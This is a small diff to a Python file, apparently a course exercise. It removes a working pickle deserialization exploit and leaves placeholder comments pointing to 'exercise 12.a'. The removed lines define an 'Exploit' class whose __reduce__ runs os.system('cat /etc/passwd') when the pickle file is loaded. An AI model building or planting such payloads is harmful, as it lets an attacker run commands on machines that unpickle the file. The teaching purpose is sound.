@@ -1,17 +1,11 @@
 import pickle
 
 
-class Exploit(object):
-    def __reduce__(self):
-        import os
-        return os.system, ("cat /etc/passwd", )
-
+# Enter code from 12.a
 
 def create_payload():
-    pickle_file = "user.pickle"
-    payload = Exploit()
-    with open(pickle_file, "wb") as file:
-        pickle.dump(payload, file)
+    # Also here from 12.a
+    print() # You may delete this line
 
 
 if __name__ == '__main__':
